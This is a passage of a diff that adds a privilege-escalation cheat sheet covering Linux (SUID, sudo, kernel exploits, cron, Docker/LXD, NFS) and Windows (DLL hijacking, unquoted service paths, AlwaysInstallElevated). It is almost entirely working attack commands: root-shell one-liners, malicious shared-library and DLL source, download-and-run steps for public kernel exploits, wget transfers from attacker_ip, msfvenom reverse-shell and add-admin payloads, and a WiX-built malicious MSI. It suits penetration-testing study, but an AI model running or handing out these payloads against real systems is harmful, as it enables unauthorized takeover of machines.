+find / -exec /bin/sh -p \; -quit
+# or
+find . -exec /bin/sh -p \;
+```
+
+**bash:**
+
+```bash
+bash -p
+# -p flag preserves SUID privileges
+```
+
+**less/more:**
+
+```bash
+less /etc/passwd
+!/bin/sh
+```
+
+**awk:**
+
+```bash
+awk 'BEGIN {system("/bin/sh")}'
+```
+
+**python/perl/ruby:**
+
+```bash
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+perl -e 'exec "/bin/sh";'
+ruby -e 'exec "/bin/sh"'
+```
+
+**cp (for file overwrite):**
+
+```bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+/tmp/rootbash -p
+```
+
+**tar:**
+
+```bash
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+
+**systemctl:**
+
+```bash
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+systemctl link $TF
+systemctl enable --now $TF
+/bin/bash -p
+```
+
+### Custom SUID Binary Exploitation
+
+**Identify custom binaries:**
+
+```bash
+find / -perm -4000 -type f 2>/dev/null | grep -v "^/usr" | grep -v "^/bin"
+```
+
+**Analysis workflow:**
+
+1. **Check binary characteristics:**
+
+```bash
+file /path/to/binary
+strings /path/to/binary
+ltrace /path/to/binary
+strace /path/to/binary
+```
+
+2. **Look for dangerous functions:**
+
+- System calls without absolute paths
+- Insecure temporary file creation
+- Buffer overflow vulnerabilities
+- Format string vulnerabilities
+
+3. **Path hijacking exploitation:**
+
+If binary calls `service` without absolute path:
+
+```bash
+cd /tmp
+echo '/bin/bash' > service
+chmod +x service
+export PATH=/tmp:$PATH
+/path/to/vulnerable/suid/binary
+```
+
+4. **Library hijacking (LD_PRELOAD/LD_LIBRARY_PATH):**
+
+[Inference] - This technique works when the binary doesn't use secure execution flags:
+
+```bash
+# Create malicious library
+cat > /tmp/exploit.c << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void inject() __attribute__((constructor));
+
+void inject() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash -p");
+}
+EOF
+
+gcc -shared -fPIC -o /tmp/exploit.so /tmp/exploit.c
+LD_PRELOAD=/tmp/exploit.so /path/to/suid/binary
+```
+
+5. **Symlink attacks:**
+
+For binaries that operate on predictable temp files:
+
+```bash
+ln -s /etc/shadow /tmp/vulnerable_temp_file
+/path/to/suid/binary
+```
+
+### SGID Exploitation Specifics
+
+**Target SGID binaries in privileged groups:**
+
+```bash
+# Find SGID binaries and their groups
+find / -perm -2000 -type f -exec ls -la {} \; 2>/dev/null
+
+# Common privileged groups: docker, lxd, disk, shadow, adm
+```
+
+**SGID shadow group exploitation:**
+
+```bash
+# If binary has SGID shadow
+/vulnerable/binary
+# Read /etc/shadow
+cat /etc/shadow
+# Crack password hashes or modify directly if writable
+```
+
+### Tools for SUID/SGID Analysis
+
+**LinPEAS (Linux Privilege Escalation Awesome Script):**
+
+```bash
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+# or
+./linpeas.sh -a 2>/dev/null
+```
+
+**Unix-privesc-check:**
+
+```bash
+unix-privesc-check standard > output.txt
+unix-privesc-check detailed > output_detailed.txt
+```
+
+---
+
+## Sudo Misconfiguration Exploitation
+
+### Enumeration
+
+**Check sudo privileges:**
+
+```bash
+sudo -l
+```
+
+**Output interpretation:**
+
+- Commands listed after `(ALL : ALL)` can be run as any user
+- `NOPASSWD:` means no password required
+- Specific user contexts: `(root) NOPASSWD: /usr/bin/binary`
+
+### Exploitation Patterns
+
+**GTFOBins sudo entries:**
+
+Consult GTFOBins (gtfobins.github.io) for sudo exploitation. Common examples:
+
+**vim/vi:**
+
+```bash
+sudo vim -c ':!/bin/sh'
+```
+
+**less:**
+
+```bash
+sudo less /etc/profile
+!/bin/sh
+```
+
+**find:**
+
+```bash
+sudo find . -exec /bin/sh \; -quit
+```
+
+**awk:**
+
+```bash
+sudo awk 'BEGIN {system("/bin/sh")}'
+```
+
+**nmap:**
+
+```bash
+echo "os.execute('/bin/sh')" > /tmp/shell.nse
+sudo nmap --script=/tmp/shell.nse
+```
+
+**env:**
+
+```bash
+sudo env /bin/sh
+```
+
+**ftp:**
+
+```bash
+sudo ftp
+!/bin/sh
+```
+
+**git:**
+
+```bash
+sudo git -p help
+!/bin/sh
+```
+
+**zip:**
+
+```bash
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+```
+
+**tar:**
+
+```bash
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+
+### Wildcard Injection
+
+**Tar wildcard exploitation:**
+
+If script runs: `sudo tar -czf backup.tar.gz *`
+
+```bash
+echo "" > "--checkpoint=1"
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "#!/bin/bash\nchmod +s /bin/bash" > shell.sh
+chmod +x shell.sh
+# Wait for script execution
+/bin/bash -p
+```
+
+**Chown wildcard exploitation:**
+
+If script runs: `sudo chown root:root *`
+
+```bash
+ln -s /etc/shadow shadow_link
+# When chown runs, ownership of /etc/shadow changes
+```
+
+### LD_PRELOAD Sudo Exploitation
+
+**Check for LD_PRELOAD preservation:**
+
+```bash
+sudo -l
+# Look for: env_keep+=LD_PRELOAD
+```
+
+**Exploit if enabled:**
+
+```bash
+cat > /tmp/preload.c << EOF
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash -p");
+}
+EOF
+
+gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
+sudo LD_PRELOAD=/tmp/preload.so <any_sudo_command>
+```
+
+### LD_LIBRARY_PATH Exploitation
+
+**Check for preservation:**
+
+```bash
+sudo -l
+# Look for: env_keep+=LD_LIBRARY_PATH
+```
+
+**Exploit technique:**
+
+```bash
+# Find a sudo binary that uses shared libraries
+ldd /usr/sbin/apache2
+# Hijack a library
+
+mkdir /tmp/lib
+cat > /tmp/lib/libcrypt.c << EOF
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+    setuid(0);
+    system("/bin/bash -p");
+}
+EOF
+
+gcc -shared -fPIC -o /tmp/lib/libcrypt.so.1 /tmp/lib/libcrypt.c
+sudo LD_LIBRARY_PATH=/tmp/lib /usr/sbin/apache2
+```
+
+### Shell Escaping from Sudo Commands
+
+**If allowed to run script editors:**
+
+```bash
+sudo vi /etc/apache2/apache2.conf
+# Then: :!/bin/bash
+```
+
+**If allowed to run package managers:**
+
+```bash
+# APT
+sudo apt-get changelog apt
+!/bin/sh
+
+# Yum
+sudo yum install -y package
+# During install, spawn shell from RPM scripts
+```
+
+**If allowed to run programming language interpreters:**
+
+```bash
+sudo python -c 'import os; os.system("/bin/bash")'
+sudo ruby -e 'exec "/bin/bash"'
+sudo lua -e 'os.execute("/bin/bash")'
+```
+
+### CVE-Based Sudo Exploits
+
+**CVE-2019-14287 (Sudo < 1.8.28):**
+
+Bypass security policy when user can run commands as any user except root:
+
+```bash
+# Configuration shows: (ALL, !root) /usr/bin/binary
+sudo -u#-1 /usr/bin/binary
+# Executes as root due to integer overflow
+```
+
+**CVE-2021-3156 (Baron Samedit - Sudo before 1.9.5p2):**
+
+Heap-based buffer overflow exploitation:
+
+```bash
+# Multiple public exploits available
+git clone https://github.com/blasty/CVE-2021-3156.git
+cd CVE-2021-3156
+make
+./sudo-hax-me-a-sandwich
+```
+
+[Unverified] - Effectiveness depends on target system configuration and exploit variant.
+
+---
+
+## Kernel Exploits
+
+### Enumeration
+
+**Identify kernel version:**
+
+```bash
+uname -a
+uname -r
+cat /proc/version
+cat /etc/os-release
+```
+
+**Detailed system information:**
+
+```bash
+hostnamectl
+lsb_release -a
+```
+
+**Architecture:**
+
+```bash
+uname -m
+dpkg --print-architecture
+```
+
+**Check for kernel hardening:**
+
+```bash
+cat /proc/sys/kernel/dmesg_restrict
+cat /proc/sys/kernel/kptr_restrict
+cat /proc/sys/kernel/perf_event_paranoid
+```
+
+### Kernel Exploit Databases
+
+**Searchsploit integration:**
+
+```bash
+searchsploit linux kernel 5.4
+searchsploit -m linux/local/exploit_id.c
+```
+
+**Linux Exploit Suggester:**
+
+```bash
+git clone https://github.com/mzet-/linux-exploit-suggester.git
+cd linux-exploit-suggester
+./linux-exploit-suggester.sh
+```
+
+**Linux Smart Enumeration (LSE):**
+
+```bash
+curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o lse.sh
+chmod +x lse.sh
+./lse.sh -l 2
+```
+
+### Notable Kernel Exploits
+
+**Dirty COW (CVE-2016-5195) - Linux Kernel 2.6.22 < 3.9:**
+
+Race condition in memory subsystem:
+
+```bash
+# Multiple variants available
+git clone https://github.com/FireFart/dirtycow.git
+cd dirtycow
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty
+```
+
+**CVE-2017-16995 - Linux Kernel 4.4 < 4.14.11:**
+
+eBPF verifier flaw:
+
+```bash
+wget https://www.exploit-db.com/raw/45010 -O exploit.c
+gcc exploit.c -o exploit
+./exploit
+```
+
+**CVE-2021-3493 (OverlayFS) - Ubuntu Kernel < 5.11.0:**
+
+OverlayFS capability bypass:
+
+```bash
+wget https://www.exploit-db.com/raw/49859 -O exploit.c
+gcc exploit.c -o exploit
+./exploit
+```
+
+**CVE-2022-0847 (Dirty Pipe) - Linux Kernel 5.8 < 5.16.11:**
+
+Arbitrary file overwrite vulnerability:
+
+```bash
+wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
+gcc exploit.c -o exploit
+./exploit
+```
+
+**CVE-2021-4034 (PwnKit) - Polkit pkexec:**
+
+Memory corruption in pkexec:
+
+```bash
+git clone https://github.com/arthepsy/CVE-2021-4034.git
+cd CVE-2021-4034
+make
+./cve-2021-4034
+```
+
+**CVE-2009-1185 (udev) - udev < 1.4.1:**
+
+Netlink message exploitation:
+
+```bash
+searchsploit -m 8572
+gcc 8572.c -o exploit
+./exploit
+```
+
+### Compilation Considerations
+
+**Cross-compilation for target architecture:**
+
+```bash
+# For 32-bit target from 64-bit system
+gcc -m32 exploit.c -o exploit
+
+# For static compilation (no library dependencies)
+gcc -static exploit.c -o exploit
+
+# For ARM architecture
+arm-linux-gnueabihf-gcc exploit.c -o exploit
+```
+
+**Transfer compiled exploits:**
+
+```bash
+# HTTP server on attacker
+python3 -m http.server 8000
+
+# On target
+wget http://attacker_ip:8000/exploit
+curl http://attacker_ip:8000/exploit -o exploit
+```
+
+### Kernel Exploit Precautions
+
+[Inference] - Kernel exploits may cause system instability or crashes. Observations from practice:
+
+- Test exploits in controlled environments first
+- Understand exploit mechanism before execution
+- Have system recovery plan ready
+- Some exploits require specific timing or race condition wins
+- Failed kernel exploits may trigger system panics
+
+---
+
+## Service Exploitation
+
+### Service Enumeration
+
+**List running services:**
+
+```bash
+ps aux
+ps -ef
+pstree -p
+```
+
+**Services running as root:**
+
+```bash
+ps aux | grep ^root
+ps -U root -u root u
+```
+
+**Network services:**
+
+```bash
+netstat -antup
+ss -tulpn
+lsof -i
+```
+
+**Systemd services:**
+
+```bash
+systemctl list-units --type=service
+systemctl status <service_name>
+systemctl show <service_name>
+```
+
+**Check service file permissions:**
+
+```bash
+find /etc/systemd/system -type f -writable 2>/dev/null
+ls -la /etc/systemd/system/*.service
+```
+
+### Writable Service Configuration
+
+**Systemd service file modification:**
+
+If service file is writable:
+
+```bash
+cat > /etc/systemd/system/vulnerable.service << EOF
+[Unit]
+Description=Vulnerable Service
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c 'chmod +s /bin/bash'
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl daemon-reload
+systemctl restart vulnerable
+/bin/bash -p
+```
+
+**Init.d script modification:**
+
+```bash
+# If /etc/init.d/service is writable
+echo "chmod +s /bin/bash" >> /etc/init.d/vulnerable_service
+/etc/init.d/vulnerable_service restart
+/bin/bash -p
+```
+
+### Writable Service Binaries
+
+**If service binary path is writable:**
+
+```bash
+# Backup original
+cp /usr/local/bin/service /tmp/service.bak
+
+# Replace with malicious binary
+cat > /tmp/payload.c << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash -p");
+    return 0;
+}
+EOF
+
+gcc /tmp/payload.c -o /usr/local/bin/service
+# Wait for service restart or restart manually
+```
+
+### Cron Job Exploitation
+
+**Enumerate cron jobs:**
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+cat /var/spool/cron/crontabs/*
+```
+
+**Writable cron scripts:**
+
+```bash
+# Find world-writable cron scripts
+find /etc/cron* -type f -perm -o+w 2>/dev/null
+
+# If script is writable
+echo "chmod +s /bin/bash" >> /path/to/cron/script.sh
+# Wait for execution
+/bin/bash -p
+```
+
+**Cron PATH exploitation:**
+
+If crontab entry runs script without absolute path:
+
+```bash
+# Create malicious binary in writable PATH location
+cat > /tmp/script.sh << EOF
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+
+chmod +x /tmp/script.sh
+# If /tmp is in cron PATH, wait for execution
+```
+
+**Wildcard injection in cron:**
+
+Similar to tar wildcard exploitation documented in sudo section.
+
+### Docker/LXD Group Privilege Escalation
+
+**Check group membership:**
+
+```bash
+id
+groups
+cat /etc/group | grep docker
+cat /etc/group | grep lxd
+```
+
+**Docker group exploitation:**
+
+```bash
+# If user is in docker group
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# Now inside container with host filesystem mounted
+```
+
+**Alternative Docker exploitation:**
+
+```bash
+docker run -v /:/hostfs --rm -it ubuntu bash
+cd /hostfs
+chroot . bash
+```
+
+**LXD/LXC group exploitation:**
+
+```bash
+# On attacker machine, build Alpine image
+git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder
+./build-alpine
+
+# Transfer alpine-v3.xx-x86_64-xxxxx.tar.gz to target
+
+# On target
+lxc image import ./alpine*.tar.gz --alias myimage
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+cd /mnt/root/root
+```
+
+### Database Service Exploitation
+
+**MySQL running as root with FILE privilege:**
+
+```bash
+mysql -u user -p
+
+# UDF (User Defined Function) exploitation
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/tmp/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select do_system('chmod +s /bin/bash');
+```
+
+**PostgreSQL as postgres user:**
+
+```bash
+psql -U postgres
+
+# Execute system commands
+COPY (SELECT '') TO PROGRAM 'chmod +s /bin/bash';
+```
+
+### NFS Misconfiguration
+
+**Check NFS exports:**
+
+```bash
+cat /etc/exports
+showmount -e <target_ip>
+```
+
+**no_root_squash exploitation:**
+
+If NFS export has `no_root_squash`:
+
+```bash
+# On attacker machine as root
+mkdir /tmp/nfs
+mount -t nfs target:/share /tmp/nfs
+cd /tmp/nfs
+
+# Create SUID binary
+cp /bin/bash .
+chmod +s bash
+
+# On target machine
+cd /share
+./bash -p
+```
+
+### Tmux/Screen Session Hijacking
+
+**Enumerate sessions:**
+
+```bash
+tmux ls
+screen -ls
+ls -la /tmp/tmux-* /var/run/screen
+```
+
+**Attach to session:**
+
+```bash
+# If session owned by root and writable socket
+tmux -S /tmp/tmux-session attach
+screen -x root/session_name
+```
+
+---
+
+**Related Critical Topics**
+
+For comprehensive privilege escalation methodology, also investigate:
+
+- **Windows Privilege Escalation** - Completely different attack surface with Registry exploitation, DLL hijacking, token impersonation, and service binary path vulnerabilities
+- **Capabilities Exploitation** - Linux capabilities system often overlooked; capabilities like CAP_SETUID provide privilege escalation without SUID
+- **Container Escape Techniques** - Docker/Kubernetes-specific breakout methods beyond group membership exploitation
+- **Exploitation Frameworks** - Metasploit's local exploit suggester, PowerSploit modules, and automated enumeration framework integration
+
+---
+
+## DLL Hijacking
+
+DLL Hijacking exploits the Windows DLL search order mechanism to execute malicious code with elevated privileges. When an application loads a DLL without specifying its absolute path, Windows searches through a predefined sequence of directories.
+
+### Windows DLL Search Order
+
+**Standard search order (without SafeDllSearchMode or with it enabled):**
+
+1. Directory from which the application loaded
+2. System directory (`C:\Windows\System32`)
+3. 16-bit system directory (`C:\Windows\System`)
+4. Windows directory (`C:\Windows`)
+5. Current working directory
+6. Directories in PATH environment variable
+
+**With SafeDllSearchMode disabled:** Current working directory moves to position 2, before system directories.
+
+### Identifying DLL Hijacking Opportunities
+
+**Using Process Monitor (Procmon)**
+
+```cmd
+# Download from Sysinternals Suite
+# Filter settings:
+- Result: NAME NOT FOUND
+- Path: ends with .dll
+- Operation: CreateFile
+```
+
+**Procmon configuration for DLL hijacking detection:**
+
+1. Run target application as administrator
+2. Apply filters: `Result is NAME NOT FOUND` and `Path ends with .dll`
+3. Identify DLLs loaded from writable directories
+4. Check if application runs with elevated privileges
+
+**PowerShell enumeration:**
+
+```powershell
+# Check writable directories in PATH
+$env:PATH -split ';' | ForEach-Object {
+    if (Test-Path $_) {
+        $acl = Get-Acl $_
+        $acl.Access | Where-Object {
+            $_.FileSystemRights -match "Write|FullControl" -and
+            $_.IdentityReference -match "Users|Everyone"
+        }
+    }
+}
+```
+
+**Using PowerUp (PowerSploit):**
+
+```powershell
+Import-Module .\PowerUp.ps1
+Find-ProcessDLLHijack
+Find-PathDLLHijack
+```
+
+### Creating Malicious DLLs
+
+**Basic DLL template (C++):**
+
+```cpp
+#include <windows.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            // Payload execution
+            system("cmd.exe /c net localgroup administrators user /add");
+            break;
+    }
+    return TRUE;
+}
+```
+
+**Compilation:**
+
+```bash
+# On Linux with mingw
+x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious.c
+
+# 32-bit version
+i686-w64-mingw32-gcc -shared -o malicious.dll malicious.c
+```
+
+**Using msfvenom:**
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o malicious.dll
+
+# 32-bit
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o malicious.dll
+```
+
+### DLL Proxying
+
+When replacing a legitimate DLL, implement proxying to maintain application functionality:
+
+**Steps:**
+
+1. Rename original DLL (e.g., `original.dll` → `original_real.dll`)
+2. Create proxy DLL that forwards legitimate calls
+3. Add malicious code in `DllMain`
+
+**Proxy generation tools:**
+
+- SharpDllProxy
+- DLL Export Viewer + manual forwarding
+
+### Common Vulnerable Scenarios
+
+**Writable application directories:**
+
+```cmd
+icacls "C:\Program Files\VulnerableApp"
+# Look for: BUILTIN\Users:(OI)(CI)(M) or similar write permissions
+```
+
+**Service-based DLL hijacking:**
+
+```cmd
+# Enumerate services and their binaries
+sc query state= all
+sc qc [ServiceName]
+
+# Check permissions
+icacls "C:\Path\To\Service.exe"
+```
+
+### Detection Commands
+
+**Using Sigcheck (Sysinternals):**
+
+```cmd
+sigcheck -u -e C:\Windows\System32
+# Identifies unsigned DLLs
+```
+
+**Listing loaded DLLs:**
+
+```cmd
+tasklist /m
+tasklist /m /fi "PID eq 1234"
+```
+
+**PowerShell:**
+
+```powershell
+Get-Process | Select-Object -ExpandProperty Modules | Sort-Object -Unique FileName
+```
+
+## PATH Hijacking
+
+PATH Hijacking exploits Windows' executable search behavior by placing malicious executables in directories that appear earlier in the PATH environment variable.
+
+### Understanding PATH Priority
+
+Windows searches for executables in this order:
+
+1. Current directory (if enabled)
+2. Directories in PATH (left to right)
+
+**Enumerate current PATH:**
+
+```cmd
+echo %PATH%
+
+# PowerShell
+$env:PATH -split ';'
+```
+
+### Identification Methodology
+
+**Check writable PATH directories:**
+
+```powershell
+$env:PATH -split ';' | ForEach-Object {
+    if (Test-Path $_) {
+        $path = $_
+        $acl = Get-Acl $path
+        Write-Host "`nPath: $path"
+        $acl.Access | Where-Object {
+            ($_.FileSystemRights -match "Write|Modify|FullControl") -and
+            ($_.IdentityReference -notmatch "SYSTEM|Administrators")
+        } | Select-Object IdentityReference, FileSystemRights
+    }
+}
+```
+
+**CMD version:**
+
+```cmd
+for %i in ("%path:;=" "%") do @icacls %i 2>nul | findstr /i "everyone users"
+```
+
+**Using PowerUp:**
+
+```powershell
+Get-ModifiablePath
+```
+
+### Exploitation Process
+
+**1. Identify target executable called without full path:**
+
+Common examples:
+
+- `wmic.exe` called as just `wmic`
+- `python` without `.exe` extension
+- Administrative scripts calling system utilities
+
+**2. Create malicious executable:**
+
+```bash
+# Using msfvenom
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o wmic.exe
+
+# Using C
+x86_64-w64-mingw32-gcc payload.c -o wmic.exe
+```
+
+**Simple payload example (C):**
+
+```c
+#include <stdlib.h>
+int main() {
+    system("cmd.exe /c net localgroup administrators lowpriv /add");
+    return 0;
+}
+```
+
+**3. Place in writable PATH directory:**
+
+```cmd
+copy malicious.exe C:\WritablePathDir\targetname.exe
+```
+
+**4. Wait for or trigger execution:**
+
+- Scheduled tasks calling the hijacked command
+- Services restarting
+- Administrative scripts
+- User executing the command
+
+### Service PATH Hijacking
+
+**Enumerate services with unquoted paths:**
+
+```cmd
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+
+**Check service permissions:**
+
+```cmd
+sc qc [ServiceName]
+accesschk.exe -accepteula -uwcv [User] *
+```
+
+### System-Wide vs User PATH
+
+**Current user PATH:**
+
+```cmd
+reg query "HKCU\Environment" /v PATH
+```
+
+**System PATH:**
+
+```cmd
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PATH
+```
+
+**Modify user PATH (if writable):**
+
+```cmd
+setx PATH "C:\Writable\Dir;%PATH%"
+```
+
+## Unquoted Service Path
+
+This vulnerability occurs when Windows services have executable paths containing spaces without proper quotation, allowing injection of malicious executables in intermediate directories.
+
+### Vulnerability Mechanics
+
+**Example vulnerable path:**
+
+```
+C:\Program Files\Vulnerable Service\service.exe
+```
+
+**Windows interprets as:**
+
+1. `C:\Program.exe`
+2. `C:\Program Files\Vulnerable.exe`
+3. `C:\Program Files\Vulnerable Service\service.exe`
+
+### Enumeration Techniques
+
+**Manual WMIC query:**
+
+```cmd
+wmic service get name,pathname,displayname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+
+**PowerShell comprehensive check:**
+
+```powershell
+Get-WmiObject -Class Win32_Service | Where-Object {
+    $_.PathName -notmatch '^"' -and 
+    $_.PathName -match ' ' -and
+    $_.PathName -notmatch 'C:\\Windows'
+} | Select-Object Name, PathName, StartMode, State
+```
+
+**Using accesschk.exe (Sysinternals):**
+
+```cmd
+accesschk.exe /accepteula -uwdq C:\
+accesschk.exe /accepteula -uwdq "C:\Program Files\"
+accesschk.exe /accepteula -uwdq "C:\Program Files (x86)\"
+```
+
+**PowerUp automated check:**
+
+```powershell
+Import-Module .\PowerUp.ps1
+Get-UnquotedService
+```
+
+**WinPEAS (automated enumeration):**
+
+```cmd
+winPEASany.exe quiet servicesinfo
+```
+
+### Exploitation Requirements
+
+**Three conditions must be met:**
+
+1. Service path contains spaces and lacks quotes
+2. Current user has write permissions to an intermediate directory
+3. Service runs with elevated privileges (LocalSystem, Administrator)
+
+**Verify service privileges:**
+
+```cmd
+sc qc [ServiceName]
+# Check SERVICE_START_NAME field
+```
+
+**Check directory permissions:**
+
+```cmd
+icacls "C:\Program Files\Vulnerable Service"
+
+# Look for:
+# BUILTIN\Users:(OI)(CI)(M)
+# BUILTIN\Users:(I)(OI)(CI)(F)
+```
+
+**Systematic permission check:**
+
+```powershell
+$path = "C:\Program Files\Vulnerable Service\subdir\service.exe"
+$parts = $path -split '\\'
+for ($i = 1; $i -lt $parts.Length - 1; $i++) {
+    $checkPath = ($parts[0..$i] -join '\')
+    if (Test-Path $checkPath) {
+        Write-Host "`nChecking: $checkPath"
+        (Get-Acl $checkPath).Access | Where-Object {
+            $_.FileSystemRights -match "Write|Modify|FullControl"
+        } | Select-Object IdentityReference, FileSystemRights
+    }
+}
+```
+
+### Exploitation Process
+
+**1. Identify vulnerable service:**
+
+```cmd
+wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+
+**2. Determine injection point:**
+
+```
+Service path: C:\Program Files\Vulnerable App\Sub Dir\service.exe
+Writable: C:\Program Files\Vulnerable App\
+
+Inject as: C:\Program Files\Vulnerable App\Sub.exe
+```
+
+**3. Generate payload:**
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o Sub.exe
+```
+
+**4. Upload and position payload:**
+
+```cmd
+copy Sub.exe "C:\Program Files\Vulnerable App\"
+```
+
+**5. Start/restart service:**
+
+```cmd
+# If you have service control permissions
+sc stop [ServiceName]
+sc start [ServiceName]
+
+# Or wait for system reboot/service restart
+shutdown /r /t 0
+```
+
+**Check service start permissions:**
+
+```cmd
+accesschk.exe /accepteula -ucqv [User] [ServiceName]
+```
+
+### Alternative Injection Points
+
+**For path:** `C:\Program Files\Company Name\Product Version\bin\service.exe`
+
+**Possible injections:**
+
+- `C:\Program.exe`
+- `C:\Program Files\Company.exe`
+- `C:\Program Files\Company Name\Product.exe`
+
+**Priority:** Windows attempts execution in order, stopping at first successful execution.
+
+## AlwaysInstallElevated
+
+This vulnerability exists when both user-level and machine-level registry settings allow standard users to install MSI packages with SYSTEM privileges.
+
+### Vulnerability Conditions
+
+**Both registry keys must be set to 1:**
+
+```
+HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
+HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
+```
+
+### Enumeration Techniques
+
+**Registry query (CMD):**
+
+```cmd
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+**PowerShell:**
+
+```powershell
+$HKLM = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
+$HKCU = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
+
+if ($HKLM.AlwaysInstallElevated -eq 1 -and $HKCU.AlwaysInstallElevated -eq 1) {
+    Write-Host "AlwaysInstallElevated is enabled!" -ForegroundColor Red
+}
+```
+
+**Using PowerUp:**
+
+```powershell
+Import-Module .\PowerUp.ps1
+Get-RegistryAlwaysInstallElevated
+Write-UserAddMSI
+```
+
+**WinPEAS detection:**
+
+```cmd
+winPEASany.exe quiet systeminfo
+```
+
+### Exploitation Methods
+
+**Method 1: Using msfvenom**
+
+```bash
+# Generate malicious MSI
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o malicious.msi
+
+# Alternative payloads
+msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi -o adduser.msi
+msfvenom -p windows/exec CMD="net localgroup administrators lowpriv /add" -f msi -o elevate.msi
+```
+
+**Method 2: Using PowerUp**
+
+```powershell
+Import-Module .\PowerUp.ps1
+
+# Creates MSI that adds user to administrators
+Write-UserAddMSI
+
+# Output: UserAdd.msi
+```
+
+**Method 3: Manual MSI creation with WiX Toolset**
+
+```xml
+<!-- product.wxs -->
+<?xml version="1.0" encoding="UTF-8"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+   <Product Id="*" Name="Malicious" Language="1033" Version="1.0.0.0" Manufacturer="Company">
+      <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" />
+      <Media Id="1" Cabinet="media1.cab" EmbedCab="yes" />
+      
+      <Directory Id="TARGETDIR" Name="SourceDir">
+         <Directory Id="ProgramFilesFolder">
+            <Directory Id="INSTALLFOLDER" Name="Product" />
+         </Directory>
+      </Directory>
+      
+      <Feature Id="ProductFeature" Title="Main" Level="1">
+         <ComponentGroupRef Id="ProductComponents" />
+      </Feature>
+      
+      <CustomAction Id="RunPayload" Directory="TARGETDIR" 
+                    ExeCommand="cmd.exe /c net localgroup administrators lowpriv /add" 
+                    Execute="deferred" Impersonate="no" Return="ignore" />
+                    
+      <InstallExecuteSequence>
+         <Custom Action="RunPayload" After="InstallInitialize" />
+      </InstallExecuteSequence>
+   </Product>
+   
+   <Fragment>
+      <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER" />
+   </Fragment>
+</Wix>
+```
+
+**Compile WiX:**
+
+```cmd
+candle.exe product.wxs
+light.exe -out malicious.msi product.wixobj
+```
+
+### Installation Execution
+
+**Silent installation (no GUI):**
+
+```cmd
+msiexec /quiet /qn /i malicious.msi
+```
+
+**Standard installation:**
+
+```cmd
+msiexec /i malicious.msi
+```
+
+**Network installation:**
+
+```cmd
+msiexec /i \\10.10.14.5\share\malicious.msi /quiet
+```
+
+**Installation with logging:**
+
+```cmd
+msiexec /i malicious.msi /L*V install.log /quiet
+```
+
+### Metasploit Module
+
+```bash
+msfconsole
+use exploit/windows/local/always_install_elevated
+set SESSION 1
